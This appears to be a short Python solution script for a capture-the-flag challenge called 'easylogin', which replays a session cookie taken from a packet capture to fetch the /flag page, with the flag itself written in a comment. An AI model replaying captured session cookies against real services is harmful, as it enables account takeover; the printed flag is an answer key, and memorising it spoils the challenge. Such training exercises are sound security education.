import requests
import re

site = "http://easylogin.challs.olicyber.it/"

r = requests.get(f"{site}/flag", cookies={"session" : "d6f816cd031715f733539affe057b5103530c23ff9aa01c5c4e71990ac2ae2ac"}).text #nel pcap troviamo il cookie di sessione
print(r)

#flag{y0u_see_th4t_w4s_3asy_e348db9c}